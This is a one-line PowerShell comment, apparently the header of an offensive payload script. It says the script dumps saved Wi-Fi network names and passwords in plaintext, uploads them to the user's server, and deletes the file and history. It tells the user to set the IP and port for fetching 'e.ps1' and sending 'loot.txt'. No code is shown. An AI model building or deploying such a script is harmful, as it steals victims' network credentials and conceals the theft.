<# This script will read all wlan SSID's and passwords in plaintext and upload them to your server, then delete the file and history. Modify ip/port to download e.ps1 & upload loot.txt #>
